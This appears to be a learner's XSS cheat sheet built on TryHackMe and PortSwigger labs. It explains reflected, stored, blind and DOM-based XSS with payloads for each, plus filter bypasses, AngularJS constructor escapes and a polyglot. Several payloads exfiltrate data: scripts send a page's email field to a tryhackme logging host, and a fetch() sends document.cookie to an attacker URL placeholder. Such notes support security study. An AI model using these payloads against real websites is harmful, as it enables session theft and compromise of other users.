# Cross-site Scripting

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

http://www.xss-payloads.com/










## Reflected XSS
The server-side application processes data from a request and echoes the data in the response. 

User-supplied data in an HTTP request is included in the webpage source without any validation.
The JavaScript is executed because it is in the HTTP response

Only affects the person making the web request.


`<script>alert(window.location.hostname)</script>`
`<script>alert(“Hello World”)</script>`
`</textarea><script>alert('THM');</script>`


```
// from "https://tryhackme.com/r/room/thatstheticket"
</textarea>
<script>
var i = new Image(); i.src="//TEST.1ba665d99ad23c9ad4b5a119f3a86aef.log.tryhackme.tech/?c="+document.getElementById('email').innerHTML;
</script>

</textarea>
<script>
var email = (document.getElementById('email').innerHTML).replace("@","-at-");
var my_address = "1ba665d99ad23c9ad4b5a119f3a86aef.log.tryhackme.tech";
var request = new XMLHttpRequest();
request.open("GET","http://" + email + "-musyoka-" + my_address, false); // with second parameter as 'true'(async) also works
request.send();
</script>
```



`<script>alert(document.cookies)</script>`
`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`

`/images/cat.jpg" onload="alert('THM');`

`"onmouseover="alert(1)` Example:
<input type="text" placeholder="Search the blog..." name="search"
value="[PAYLOAD HERE]">









### Avoid Filters
`<sscriptcript>alert('THM');</sscriptcript>`


Search:
`\"-alert(1)}//`












## Stored XSS
Is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example: post comments stored in a database.

### Blind XSS
Is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.


Tool: <https://github.com/mandatoryprogrammer/xsshunter-express>


Examples:
`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`



anchor href attribute
<a href="javascript:alert(1)">








## DOM-based XSS
When JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`.

The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.

The "sinks" manipulate the DOM, and then the DOM causes the JavaScript to execute.

- document.write
`"><svg onload=alert(1)>`
`fooBar" onload="alert(1)`

- innerHTML sink using source location.search
`<img src=1 onerror=alert(1)>`
`<img src='0' onerror=alert(1)>`


### DOM XSS in jQuery anchor href attribute sink using `location.search`
```
<a id="backLink" href="/">Back</a>
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>
```

original: https://example.path/feedback?returnPath=/
modified: https://example.path/feedback?returnPath=javascript:alert(document.cookie)



### escape javaScript
`';alert('THM');//`



### Angular
`{{$on.constructor('alert(1)')()}}`
`{{$eval.constructor('alert(1)')()}}`
`{{$resume.constructor('alert(1)')()}}`
- The constructor data property of an Object instance returns a reference to the constructor function that created the instance object. <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor>

Explanation:
`Function('console.log("Hello World")')(); // anonymous function made using the Function constructor`

```
function test() {
	console.log('Hello World');
}

console.log(test.constructor); // returns "Hello World"

let mySecondFunction = test.constructor('console.log("Hello World 2!")');
mySecondFunction(); // returns "Hello World 2!"
```


















## Polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
